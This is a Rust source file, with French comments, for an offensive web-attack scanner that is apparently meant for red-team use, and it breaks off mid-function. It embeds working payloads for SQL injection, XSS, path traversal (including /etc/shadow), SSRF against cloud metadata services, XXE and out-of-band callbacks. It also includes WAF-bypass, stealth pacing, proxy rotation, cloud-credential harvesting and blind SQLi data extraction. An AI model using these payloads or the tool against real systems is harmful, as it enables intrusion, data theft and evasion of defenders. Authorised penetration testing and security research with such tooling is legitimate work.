//! DIAPILE — Web Attack Module
//!
//! Détection implémentée :
//! - SQLi — error-based, boolean blind, time-based (confirmé sur 3 échantillons)
//! - XSS — reflected (heuristique de reflet, contexte DOM partiel), stored (délégué)
//! - SSRF — patterns directs + confirmation OOB
//! - Path Traversal / LFI (par patterns de fichiers) et wrappers `file://`/`expect://`
//! - XXE — lecture de fichier + DTD OOB
//! - Command Injection — evidence, time-based confirmé, OOB
//! - Open Redirect, CORS, SSTI, GraphQL, OAuth2, HTTP Smuggling (temporel)
//! - CRLF injection / HTTP response splitting, CSRF (formulaires mutateurs sans
//!   jeton), IDOR / contrôle d'accès manquant (différentiel authentifié/anon),
//!   RFI (conservateur), NoSQL injection (`$ne`/`$gt`/…), désérialisation
//!   (signatures binaires/ObjC/Java/PHP) — tous **opt-in** via `WebAttackConfig`.
//! - JWT — inspection, `alg:none` forgé (jamais envoyé), brute-force HMAC limité,
//!   RS→HS signalé sans forge
//! - Extraction SQLi — trois vecteurs sélectionnés automatiquement par ordre de
//!   préférence : UNION (lecture directe), boolean blind, time-based blind
//!   (voir `extract_sqli_data` et `select_reader`).
//!
//! LISTES EXTERNES :
//!   - `--web-payloads KIND=FILE` (répétable) ajoute des payloads depuis un `.txt`
//!     aux listes embarquées de la famille (voir `PayloadKind` / `ExternalPayloads`).
//!     `--web-payloads-replace` substitue la liste embarquée par celle du fichier.
//!     Colonnes séparées par TABULATION ; le marqueur de détection est optionnel
//!     (sans lui, la famille retombe sur la détection générique — davantage de
//!     faux positifs possibles).
//!
//! LIMITES RESTANTES :
//!   - Le rendu JavaScript n'est pas exécuté : les SPA ne sont pas couvertes.
//!   - Les classes heuristiques (XSS reflected, SSRF direct, GraphQL, HTTP
//!     Smuggling) produisent des faux positifs : à confirmer manuellement.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use crate::main_helpers::redact_file_secrets;
use base64::Engine;
use futures::stream::StreamExt;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::time::Duration;

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WebVuln {
    pub vuln_type: String,
    pub url: String,
    pub parameter: String,
    pub payload: String,
    pub evidence: String,
    pub severity: String,
    pub confidence: f32,
    pub remediation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct WebScanReport {
    pub target: String,
    pub pages_tested: usize,
    pub vulns: Vec<WebVuln>,
    pub forms: Vec<HtmlForm>,
    pub endpoints: Vec<String>,
    /// Secrets récoltés par chaînage d'exploitation (SSRF → métadonnées cloud).
    pub secrets: Vec<CloudSecret>,
    /// Extractions de données post-exploitation (SQLi blind — opt-in).
    pub extractions: Vec<SqliExtraction>,
}

/// Secret extrait d'un service cloud à la suite d'un SSRF confirmé.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudSecret {
    /// Fournisseur : `aws` (IMDSv1 est le seul joignable sans en-tête dédié).
    pub provider: String,
    /// Nature du secret : `aws_access_key_id`, `aws_secret_access_key`,
    /// `aws_session_token`, `password`, …
    pub kind: String,
    /// Valeur brute — masquée avant toute écriture sur disque.
    pub value: String,
    /// URL interne d'où provient la donnée.
    pub source: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HtmlForm {
    pub action: String,
    pub method: String,
    pub inputs: Vec<String>,
}

/// Contexte d'authentification de l'opérateur, injecté dans TOUTES les requêtes
/// du scanner : sans lui, la surface authentifiée (≈80 % du réel) reste invisible.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct WebAuth {
    /// Valeur brute de l'en-tête `Cookie` (ex: `PHPSESSID=…; csrftoken=…`)
    pub cookies: Option<String>,
    /// Jeton `Authorization: Bearer <token>`
    pub bearer: Option<String>,
    /// En-têtes additionnels (ex: `X-Api-Key: …`)
    pub extra_headers: Vec<(String, String)>,
}

impl WebAuth {
    /// Traduit le contexte en en-têtes HTTP concrets.
    pub fn to_headers(&self) -> reqwest::header::HeaderMap {
        use reqwest::header::{HeaderMap, HeaderName, HeaderValue, AUTHORIZATION, COOKIE};
        let mut headers = HeaderMap::new();
        if let Some(b) = self.bearer.as_deref() {
            if let Ok(v) = HeaderValue::from_str(&format!("Bearer {}", b)) {
                headers.insert(AUTHORIZATION, v);
            }
        }
        if let Some(c) = self.cookies.as_deref() {
            if let Ok(v) = HeaderValue::from_str(c) {
                headers.insert(COOKIE, v);
            }
        }
        for (k, val) in &self.extra_headers {
            if let (Ok(name), Ok(v)) = (
                HeaderName::from_bytes(k.trim().as_bytes()),
                HeaderValue::from_str(val),
            ) {
                headers.insert(name, v);
            }
        }
        headers
    }

    pub fn is_empty(&self) -> bool {
        self.cookies.is_none() && self.bearer.is_none() && self.extra_headers.is_empty()
    }
}

#[derive(Debug, Clone)]
pub struct WebAttackConfig {
    pub timeout: Duration,
    pub follow_redirects: bool,
    pub user_agent: String,
    pub max_pages: usize,
    pub test_sqli: bool,
    pub test_xss: bool,
    pub test_ssrf: bool,
    pub test_traversal: bool,
    pub test_xxe: bool,
    pub test_jwt: bool,
    pub test_cmd_inject: bool,
    /// Scanners avancés orchestrés par `full_web_scan`.
    pub test_ssti: bool,
    pub test_cors: bool,
    pub test_graphql: bool,
    pub test_oauth2: bool,
    pub test_blind_sqli: bool,
    pub test_open_redirect: bool,
    /// CRLF injection / HTTP response splitting.
    pub test_crlf: bool,
    /// CSRF — formulaires mutateurs sans jeton (analyse des formulaires du spider).
    pub test_csrf: bool,
    /// IDOR / contrôle d'accès manquant — différentiel authentifié/anon.
    /// Inopérant sans contexte d'auth opérateur (`--cookie`/`--bearer`).
    pub test_idor: bool,
    /// RFI — inclusion de fichier distant (détection conservatrice).
    pub test_rfi: bool,
    /// NoSQL injection (opérateurs `$ne`/`$gt`/…).
    pub test_nosql: bool,
    /// Désérialisation non sécurisée (blob exposé + erreurs natives).
    pub test_deserialize: bool,
    /// HTTP Request Smuggling (CL.TE / TE.TE). Désactivé par défaut : sonde
    /// volontairement lente (timeouts) et de confiance faible.
    pub test_smuggling: bool,
    /// Crawl multi-pages (`WebSpider`) pour la découverte de surface, au lieu
    /// d'une simple extraction de paramètres sur la page d'accueil.
    pub spider: bool,
    /// Profondeur de crawl (utilisée seulement si `spider`).
    pub max_depth: usize,
    pub ssrf_callback: Option<String>, // URL de callback pour SSRF OOB
    /// Nombre de paramètres testés simultanément (P0.1). 1 = séquentiel.
    /// Valeur plafonnée par le profil de furtivité (`stealth_level`) : un
    /// `--stealth redteam` ne peut pas être contourné par un `--web-concurrency` élevé.
    pub concurrency: usize,
    /// Pacing furtif : `off|default` = pas de réduction, `redteam|stealth|opsec|low`
    /// = parallélisme réduit (et rotation d'User-Agent). Alimente
    /// `evasion::effective_parallelism` / `evasion::pick_user_agent`.
    pub stealth_level: String,
    /// Rejoue des variantes d'encodage (tamper) quand un WAF bloque la requête (P0.2).
    pub waf_bypass: bool,
    /// Contexte d'authentification (P0.4).
    pub auth: WebAuth,
    /// Essais max par requête sur erreur réseau transitoire (P1.1). 1 = aucun retry.
    pub retries: usize,
    /// Pool de proxies (round-robin, P1.3). Vide = connexion directe.
    /// Sert à répartir les requêtes sur plusieurs IP sources (anti rate-limiting / OPSEC).
    pub proxies: Vec<String>,
    /// Extraction de données post-exploitation (SQLi blind/lfi/cmdi). Opt-in :
    /// très bavard et agressif (centaines de requêtes par paramètre).
    pub extract_data: bool,
    /// Longueur maximale d'une valeur extraite (identifiant, ligne…).
    pub extract_max_len: usize,
    /// Nombre maximal d'items extraits par catégorie (bases, tables, colonnes, lignes).
    pub extract_max_items: usize,
    /// Listes de payloads externes (fichiers `.txt`), chargées une fois par
    /// `load_from_file` et fusionnées aux payloads embarqués.
    pub external: ExternalPayloads,
}

impl Default for WebAttackConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(10),
            follow_redirects: true,
            user_agent: "Mozilla/5.0 (compatible; NRTG/2.0)".into(),
            max_pages: 20,
            test_sqli: true,
            test_xss: true,
            test_ssrf: true,
            test_traversal: true,
            test_xxe: true,
            test_jwt: true,
            test_cmd_inject: true,
            test_ssti: true,
            test_cors: true,
            test_graphql: true,
            test_oauth2: true,
            test_blind_sqli: true,
            test_open_redirect: true,
            test_crlf: true,
            test_csrf: true,
            test_idor: true,
            test_rfi: true,
            test_nosql: true,
            test_deserialize: true,
            test_smuggling: false,
            spider: true,
            max_depth: 2,
            ssrf_callback: None,
            concurrency: 16,
            stealth_level: "default".into(),
            waf_bypass: true,
            auth: WebAuth::default(),
            retries: 2,
            proxies: Vec::new(),
            extract_data: false,
            extract_max_len: 48,
            extract_max_items: 5,
            external: ExternalPayloads::default(),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Payloads
// ─────────────────────────────────────────────────────────────────────────────

// ── Listes de payloads externes (fichiers .txt) ─────────────────────────────
//
// Format : une entrée par ligne, colonnes séparées par TABULATION (`\t`).
// `#` en tête de ligne = commentaire, lignes vides ignorées, colonnes `trim`-ées.
// Le marqueur (2ᵉ colonne) est optionnel : s'il est absent, la détection
// retombe sur le comportement générique du scanner.
//
//   sqli       payload <TAB> marqueur d'erreur SQL (regex alternée par `|`), optionnel
//   xss        payload
//   traversal  payload <TAB> marqueur de fichier lu, optionnel
//   ssrf       url     <TAB> marqueur de réponse interne, optionnel
//   xxe        xml     <TAB> marqueur de fichier lu, optionnel
//   cmdi       commande<TAB> marqueur (`uid=`…), optionnel
//   ssti       payload <TAB> moteur <TAB> marqueur d'évaluation (3 colonnes)
//   crlf       payload <TAB> libellé (2 colonnes, libellé optionnel)
//   params     nom de paramètre (utilisé par les gates IDOR / paramètres défaut)

/// Plafond d'entrées par fichier de payloads externe (garde-fou mémoire).
pub const MAX_PAYLOAD_ENTRIES: usize = 20_000;

/// Familles de payloads chargeables depuis un fichier `.txt` (`--web-payloads`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadKind {
    Sqli,
    Xss,
    Traversal,
    Ssrf,
    Xxe,
    Cmdi,
    Ssti,
    Crlf,
    Params,
}

impl PayloadKind {
    /// Nombre de colonnes attendu (séparateur `\t`).
    pub fn columns(self) -> usize {
        match self {
            PayloadKind::Sqli
            | PayloadKind::Traversal
            | PayloadKind::Ssrf
            | PayloadKind::Xxe
            | PayloadKind::Cmdi
            | PayloadKind::Crlf => 2,
            PayloadKind::Ssti => 3,
            PayloadKind::Xss | PayloadKind::Params => 1,
        }
    }

    /// Libellé utilisé dans l'aide CLI et les messages d'erreur.
    pub fn label(self) -> &'static str {
        match self {
            PayloadKind::Sqli => "sqli",
            PayloadKind::Xss => "xss",
            PayloadKind::Traversal => "traversal",
            PayloadKind::Ssrf => "ssrf",
            PayloadKind::Xxe => "xxe",
            PayloadKind::Cmdi => "cmdi",
            PayloadKind::Ssti => "ssti",
            PayloadKind::Crlf => "crlf",
            PayloadKind::Params => "params",
        }
    }

    /// Analyse le nom de famille fourni en CLI. Insensible à la casse.
    pub fn from_cli(s: &str) -> Option<Self> {
        match s.trim().to_ascii_lowercase().as_str() {
            "sqli" | "sql" => Some(PayloadKind::Sqli),
            "xss" => Some(PayloadKind::Xss),
            "traversal" | "lfi" | "path" => Some(PayloadKind::Traversal),
            "ssrf" => Some(PayloadKind::Ssrf),
            "xxe" => Some(PayloadKind::Xxe),
            "cmdi" | "command" | "rce" => Some(PayloadKind::Cmdi),
            "ssti" | "template" => Some(PayloadKind::Ssti),
            "crlf" | "header" => Some(PayloadKind::Crlf),
            "params" | "param" => Some(PayloadKind::Params),
            _ => None,
        }
    }

    /// Toutes les familles, dans l'ordre d'affichage de l'aide.
    pub fn all() -> [PayloadKind; 9] {
        [
            PayloadKind::Sqli,
            PayloadKind::Xss,
            PayloadKind::Traversal,
            PayloadKind::Ssrf,
            PayloadKind::Xxe,
            PayloadKind::Cmdi,
            PayloadKind::Ssti,
            PayloadKind::Crlf,
            PayloadKind::Params,
        ]
    }
}

/// Listes de payloads externes, fusionnées aux listes embarquées.
#[derive(Debug, Clone, Default)]
pub struct ExternalPayloads {
    /// `(payload, marqueur d'erreur SQL)`.
    pub sqli: Vec<(String, String)>,
    /// Payloads XSS simples.
    pub xss: Vec<String>,
    /// `(payload, marqueur de fichier lu)`.
    pub traversal: Vec<(String, String)>,
    /// `(url, marqueur de réponse interne)`.
    pub ssrf: Vec<(String, String)>,
    /// `(corps XML, marqueur)`.
    pub xxe: Vec<(String, String)>,
    /// `(commande, marqueur)`.
    pub cmdi: Vec<(String, String)>,
    /// `(payload, moteur, marqueur d'évaluation)`.
    pub ssti: Vec<(String, String, String)>,
    /// `(payload, libellé)`.
    pub crlf: Vec<(String, String)>,
    /// Noms de paramètres additionnels.
    pub params: Vec<String>,
}

/// Charge un fichier de payloads à `columns` colonnes séparées par tabulation.
///
/// `#` en tête = commentaire, lignes vides ignorées, colonnes `trim`-ées,
/// dédoublonnage conservant la première occurrence, plafond
/// [`MAX_PAYLOAD_ENTRIES`]. Les colonnes manquantes sont complétées par des
/// chaînes vides (le marqueur est optionnel) ; une ligne sans première colonne
/// utile est ignorée. Le chemin est résolu via `resolve_config_path`.
pub fn load_payload_file(path: &str, columns: usize) -> Result<Vec<Vec<String>>, String> {
    let resolved = crate::resolve_config_path(path);
    let raw = std::fs::read_to_string(&resolved)
        .map_err(|e| format!("payloads « {} » illisibles : {}", resolved, e))?;
    let mut seen = std::collections::HashSet::new();
    let mut out: Vec<Vec<String>> = Vec::new();
    for line in raw.lines() {
        let line = line.trim_end_matches('\r');
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let mut cols: Vec<String> = if columns <= 1 {
            vec![trimmed.to_string()]
        } else {
            line.split('\t').map(|c| c.trim().to_string()).collect()
        };
        if cols.len() > columns {
            cols.truncate(columns);
        }
        while cols.len() < columns {
            cols.push(String::new());
        }
        if cols[0].is_empty() {
            continue;
        }
        if !seen.insert(cols.clone()) {
            continue;
        }
        out.push(cols);
        if out.len() >= MAX_PAYLOAD_ENTRIES {
            break;
        }
    }
    if out.is_empty() {
        return Err(format!(
            "payloads « {} » vide (aucune entrée utile)",
            resolved
        ));
    }
    Ok(out)
}

impl ExternalPayloads {
    /// Charge `path` pour la famille `kind` et l'ajoute aux payloads déjà
    /// présents (ou les remplace si `replace`). Renvoie
    /// `(entrées chargées, total de la famille)`.
    pub fn load_from_file(
        &mut self,
        kind: PayloadKind,
        path: &str,
        replace: bool,
    ) -> Result<(usize, usize), String> {
        let cols = load_payload_file(path, kind.columns())?;
        let loaded = cols.len();
        if replace {
            self.clear(kind);
        }
        for c in cols {
            self.push_row(kind, c);
        }
        Ok((loaded, self.len(kind)))
    }

    /// Vide la famille indiquée.
    fn clear(&mut self, kind: PayloadKind) {
        match kind {
            PayloadKind::Sqli => self.sqli.clear(),
            PayloadKind::Xss => self.xss.clear(),
            PayloadKind::Traversal => self.traversal.clear(),
            PayloadKind::Ssrf => self.ssrf.clear(),
            PayloadKind::Xxe => self.xxe.clear(),
            PayloadKind::Cmdi => self.cmdi.clear(),
            PayloadKind::Ssti => self.ssti.clear(),
            PayloadKind::Crlf => self.crlf.clear(),
            PayloadKind::Params => self.params.clear(),
        }
    }

    /// Ajoute une ligne (colonnes déjà complétées) à la famille indiquée.
    fn push_row(&mut self, kind: PayloadKind, mut c: Vec<String>) {
        match kind {
            PayloadKind::Xss => self.xss.push(c.remove(0)),
            PayloadKind::Params => self.params.push(c.remove(0)),
            PayloadKind::Ssti => {
                let third = if c.len() > 2 {
                    c.remove(2)
                } else {
                    String::new()
                };
                let second = if c.len() > 1 {
                    c.remove(1)
                } else {
                    String::new()
                };
                self.ssti.push((c.remove(0), second, third));
            }
            _ => {
                let second = if c.len() > 1 {
                    c.remove(1)
                } else {
                    String::new()
                };
                let first = c.remove(0);
                match kind {
                    PayloadKind::Sqli => self.sqli.push((first, second)),
                    PayloadKind::Traversal => self.traversal.push((first, second)),
                    PayloadKind::Ssrf => self.ssrf.push((first, second)),
                    PayloadKind::Xxe => self.xxe.push((first, second)),
                    PayloadKind::Cmdi => self.cmdi.push((first, second)),
                    PayloadKind::Crlf => self.crlf.push((first, second)),
                    _ => {}
                }
            }
        }
    }

    /// Nombre d'entrées actuellement dans la famille.
    pub fn len(&self, kind: PayloadKind) -> usize {
        match kind {
            PayloadKind::Sqli => self.sqli.len(),
            PayloadKind::Xss => self.xss.len(),
            PayloadKind::Traversal => self.traversal.len(),
            PayloadKind::Ssrf => self.ssrf.len(),
            PayloadKind::Xxe => self.xxe.len(),
            PayloadKind::Cmdi => self.cmdi.len(),
            PayloadKind::Ssti => self.ssti.len(),
            PayloadKind::Crlf => self.crlf.len(),
            PayloadKind::Params => self.params.len(),
        }
    }
}

/// Payloads SQLi embarqués, complétés par les payloads externes (`ext.sqli`).
fn sqli_payloads(ext: &ExternalPayloads) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = vec![
        // (payload, strict_sql_error_evidence — SEULEMENT patterns SQL verbeux, pas "error" ni "syntax" seuls)
        ("'",                   "you have an error in your sql syntax|unclosed quotation mark|quoted string not properly terminated|pg_query()|syntax error at or near|ora-01756|sqlite_exception|microsoft oledb provider for sql server|odbc sql server driver|supplied argument is not a valid mysql|sqlstate|mysql server version|check the manual"),
        ("''",                  "mysql server version|sqlstate|syntax error at or near|unclosed quotation mark"),
        ("1 OR 1=1--",          ""),
        ("1' OR '1'='1",        ""),
        ("1; SELECT SLEEP(2)--", ""),
        ("1 AND 1=2 UNION SELECT NULL,NULL,NULL--", "NULL,NULL"),
        ("' UNION SELECT 1,2,3--", "UNION SELECT"),
        ("admin'--",            ""),
        ("1' AND SLEEP(2)--",   ""),
        ("1; WAITFOR DELAY '0:0:2'--", ""),
        ("' OR 1=1#",           ""),
        ("\" OR \"\"=\"",       ""),
        ("1 AND 1=1",           ""),
        ("1 AND 1=2",           ""),
        ("' || '1'=='1",        ""),
        ("{\"$gt\": \"\"}",     ""),
        ("{\"$ne\": null}",     ""),
    ].into_iter().map(|(p, e)| (p.to_string(), e.to_string())).collect();
    out.extend(ext.sqli.iter().cloned());
    out
}

// ── Contexte d'injection SQL ────────────────────────────────────────────────

/// Contexte d'injection déduit d'une sonde `'` / `"` / `')`.
///
/// Générer les payloads *pour ce contexte* évite d'envoyer 17 variantes
/// aveugles : on sait quel guillemet ferme la chaîne, si le point d'injection
/// est dans un appel de fonction (parenthèse à fermer), et quel SGBD répond
/// (donc quelle syntaxe de commentaire et quelle primitive de délai marchent).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SqliContext {
    /// Guillemet qui déclenche l'erreur : `'` ou `"`.
    pub quote: &'static str,
    /// Une parenthèse ouvrante doit être refermée avant le commentaire.
    pub paren: bool,
    /// Commentaire de fin de requête retenu par défaut.
    pub comment: &'static str,
    /// SGBD identifié d'après la signature d'erreur, si reconnaissable.
    pub dbms: Option<&'static str>,
}

/// Identifie le SGBD à partir du texte d'erreur SQL.
fn classify_sqli_dbms(body_lower: &str) -> Option<&'static str> {
    const SIGNATURES: &[(&str, &str)] = &[
        ("you have an error in your sql syntax", "mysql"),
        ("mariadb", "mysql"),
        ("mysql_fetch_array", "mysql"),
        ("pg_query", "postgres"),
        ("syntax error at or near", "postgres"),
        ("postgresql", "postgres"),
        ("unclosed quotation mark", "mssql"),
        ("incorrect syntax near", "mssql"),
        ("microsoft oledb provider for sql server", "mssql"),
        ("odbc sql server driver", "mssql"),
        ("ora-", "oracle"),
        ("quoted string not properly terminated", "oracle"),
        ("sqlite", "sqlite"),
    ];
    SIGNATURES
        .iter()
        .find(|(sig, _)| body_lower.contains(sig))
        .map(|(_, dbms)| *dbms)
}

/// Commentaires de fin de requête utilisables pour ce SGBD.
/// MySQL accepte aussi `#` : le tester permet de passer les filtres naïfs qui
/// ne bloquent que `--`.
fn comments_for_dbms(dbms: Option<&str>) -> &'static [&'static str] {
    match dbms {
        Some("mysql") => &["-- ", "#", "/*"],
        _ => &["-- "],
    }
}

/// Sonde le paramètre avec des terminaisons minimales et retourne le contexte
/// d'injection si une erreur SQL stricte remonte (jamais sur un blocage WAF).
async fn detect_sqli_context(
    client: &Client,
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Option<SqliContext> {
    // (sonde, parenthèse ouvrante à refermer)
    const PROBES: &[(&str, bool)] = &[
        ("'", false),
        ("\"", false),
        ("')", true),
        ("\")", true),
        ("'-- ", false),
    ];

    for (probe, paren) in PROBES {
        let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(probe));
        let Some((status, body, _)) = http_get(client, &test_url, cfg.retries).await else {
            continue;
        };
        // Un 401/403/429 est un blocage, jamais une preuve d'injection.
        if matches!(status, 401 | 403 | 407 | 429) {
            continue;
        }
        let body_lower = body.to_lowercase();
        if contains_strict_sqli_error(&body_lower) {
            let dbms = classify_sqli_dbms(&body_lower);
            return Some(SqliContext {
                quote: if probe.starts_with('"') { "\"" } else { "'" },
                paren: *paren,
                comment: comments_for_dbms(dbms)[0],
                dbms,
            });
        }
    }
    None
}

/// Payloads générés pour le contexte détecté (boolean, UNION et time-based
/// adaptés au guillemet, à la parenthèse et au SGBD réels).
fn sqli_context_payloads(ctx: &SqliContext) -> Vec<(String, &'static str)> {
    let q = ctx.quote;
    let p = if ctx.paren { ")" } else { "" };
    let mut out: Vec<(String, &'static str)> = Vec::new();

    for c in comments_for_dbms(ctx.dbms) {
        out.push((format!("{q}{p} AND 1=1{c}"), ""));
        out.push((format!("{q}{p} AND 1=2{c}"), ""));
        out.push((format!("{q}{p} UNION SELECT 1,2,3{c}"), "UNION SELECT"));
        out.push((
            format!("{q}{p} UNION SELECT NULL,NULL,NULL{c}"),
            "NULL,NULL",
        ));
    }

    // Time-based : uniquement la primitive réellement supportée par le SGBD
    // identifié (repli sur les trois principales si le SGBD n'est pas reconnu).
    let db = ctx.dbms;
    if db == Some("mysql") || db.is_none() {
        out.push((format!("{q}{p} AND SLEEP(3)-- "), ""));
    }
    if db == Some("postgres") || db.is_none() {
        out.push((format!("{q}{p} AND pg_sleep(3)-- "), ""));
    }
    if db == Some("mssql") || db.is_none() {
        out.push((format!("{q}{p}; WAITFOR DELAY '0:0:3'-- "), ""));
    }
    if db == Some("oracle") {
        out.push((
            format!("{q}{p} AND dbms_pipe.receive_message(('a'),3) IS NULL-- "),
            "",
        ));
    }
    out
}

/// Payloads XSS embarqués, complétés par les payloads externes (`ext.xss`).
fn xss_payloads(ext: &ExternalPayloads) -> Vec<String> {
    let mut out: Vec<String> = vec![
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "\"><img src=x onerror=alert(document.domain)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        // Encoded variants
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
    ]
    .into_iter()
    .map(|s| s.to_string())
    .collect();
    out.extend(ext.xss.iter().cloned());
    out
}

// ── Contexte de réflexion XSS ───────────────────────────────────────────────

/// Zone du document où le paramètre est reflété. Détermine la syntaxe qui
/// ferme réellement le contexte : sans ça, un payload `<script>` injecté dans
/// une valeur d'attribut est inerte (donc faux négatif).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum XssContext {
    /// Entre balises : le payload doit ouvrir sa propre balise.
    HtmlText,
    /// À l'intérieur d'une balise (valeur d'attribut) : il faut d'abord
    /// sortir de l'attribut puis injecter un gestionnaire d'événement.
    Attribute,
    /// À l'intérieur d'un bloc `<script>` ouvert : la syntaxe est du JS.
    ScriptBlock,
    /// Marqueur non retrouvé dans la réponse (paramètre non reflété).
    NotFound,
}

/// Déduit le contexte de réflexion autour de `marker` dans `body`.
fn classify_xss_context(body: &str, marker: &str) -> XssContext {
    let Some(pos) = body.find(marker) else {
        return XssContext::NotFound;
    };
    let before = &body[..pos];

    // Dans un bloc `<script>` ouvert et non refermé ?
    let open_script = before.rfind("<script");
    let close_script = before.rfind("</script");
    if let Some(o) = open_script {
        if close_script.map(|c| c < o).unwrap_or(true) {
            return XssContext::ScriptBlock;
        }
    }

    // Dans une balise ouvrante non encore terminée (`<` après le dernier `>`) ?
    let last_lt = before.rfind('<');
    let last_gt = before.rfind('>');
    let in_tag = matches!(last_lt, Some(l) if last_gt.map(|g| g < l).unwrap_or(true));
    if in_tag {
        return XssContext::Attribute;
    }

    XssContext::HtmlText
}

/// Payloads adaptés au contexte détecté. `marker` sert de preuve de réflexion.
fn xss_context_payloads(ctx: XssContext, marker: &str) -> Vec<String> {
    match ctx {
        XssContext::ScriptBlock => vec![
            format!("';alert('{marker}');//"),
            format!("\";alert('{marker}');//"),
            format!("</script><img src=x onerror=alert('{marker}')>"),
        ],
        XssContext::Attribute => vec![
            format!("\" onmouseover=\"alert('{marker}')\" x=\""),
            format!("' onmouseover='alert(\"{marker}\")' x='"),
            format!("\"><img src=x onerror=alert('{marker}')>"),
        ],
        XssContext::HtmlText => vec![
            format!("<img src=x onerror=alert('{marker}')>"),
            format!("<svg onload=alert('{marker}')>"),
            format!("<script>alert('{marker}')</script>"),
        ],
        XssContext::NotFound => Vec::new(),
    }
}

/// Payloads LFI/traversée embarqués, complétés par les payloads externes
/// (`ext.traversal`).
fn path_traversal_payloads(ext: &ExternalPayloads) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = vec![
        ("../../../etc/passwd", "root:x:0:0"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:x:0:0"),
        ("....//....//....//etc/passwd", "root:x:0:0"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0"),
        ("../../../windows/win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("/etc/passwd", "root:x:0:0"),
        ("/proc/self/environ", "HOME=|USER=|SHELL="),
        ("/etc/shadow", "root:"),
        ("../../../../boot.ini", "[boot loader]"),
        // PHP wrappers
        (
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "cm9vdA",
        ),
        ("php://input", ""),
        ("file:///etc/passwd", "root:x:0:0"),
        ("expect://id", "uid="),
    ]
    .into_iter()
    .map(|(p, e)| (p.to_string(), e.to_string()))
    .collect();
    out.extend(ext.traversal.iter().cloned());
    out
}

/// Payloads SSRF embarqués + OOB, complétés par les payloads externes
/// (`ext.ssrf`).
fn ssrf_payloads(
    callback: Option<&str>,
    token: &str,
    ext: &ExternalPayloads,
) -> Vec<(String, String)> {
    let mut payloads: Vec<(String, String)> = vec![
        // Internal services
        ("http://localhost/", "localhost|127"),
        ("http://127.0.0.1/", "127.0.0.1"),
        ("http://169.254.169.254/", "ami-id|instanceId|metadata"), // AWS metadata
        (
            "http://169.254.169.254/latest/meta-data/",
            "ami-id|hostname",
        ),
        ("http://metadata.google.internal/", "google|metadata"), // GCP
        ("http://192.168.0.1/", ""),
        ("http://10.0.0.1/", ""),
        ("http://0.0.0.0/", ""),
        // Protocol smuggling
        ("dict://127.0.0.1:11211/", "VERSION"), // Memcached
        ("gopher://127.0.0.1:6379/_INFO\r\n", "redis_version"), // Redis
        ("file:///etc/passwd", "root:x:0:0"),
    ]
    .into_iter()
    .map(|(p, e)| (p.to_string(), e.to_string()))
    .collect();
    // OOB — SSRF aveugle : un token unique par paramètre, confirmé par l'écouteur.
    if let Some(cb) = callback {
        let cb = cb.trim_end_matches('/');
        if !cb.is_empty() && !token.is_empty() {
            payloads.push((format!("{}/{}", cb, token), String::new()));
        }
    }
    // OOB DNS — la simple résolution du nom suffit (cible sans sortie TCP).
    if let Some(name) = crate::oob::OobListener::dns_name(token) {
        payloads.push((format!("http://{}/", name), String::new()));
    }
    // Payloads externes (fichier `--web-payloads ssrf=…`).
    payloads.extend(ext.ssrf.iter().cloned());
    payloads
}

/// Payloads XXE embarqués + OOB, complétés par les payloads externes
/// (`ext.xxe`).
fn xxe_payloads(
    callback: Option<&str>,
    token: &str,
    ext: &ExternalPayloads,
) -> Vec<(String, String)> {
    let mut payloads: Vec<(String, String)> = vec![
        (r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
         "root:x:0:0".to_string()),
        (r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>"#.to_string(),
         "root:".to_string()),
        (r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>"#.to_string(),
         "ami-id|hostname".to_string()),
        // XXE in SVG
        (r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>"#.to_string(), "root:".to_string()),
    ];
    // Blind XXE via OOB — le parseur XML doit résoudre le DTD distant (token unique).
    if let Some(cb) = callback {
        let cb = cb.trim_end_matches('/');
        if !cb.is_empty() && !token.is_empty() {
            payloads.push((
                format!(r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}/{}">%xxe;]><foo>test</foo>"#, cb, token),
                String::new(),
            ));
        }
    }
    // OOB DNS — résolution du nom par le parseur XML (aucune sortie HTTP requise).
    if let Some(name) = crate::oob::OobListener::dns_name(token) {
        payloads.push((
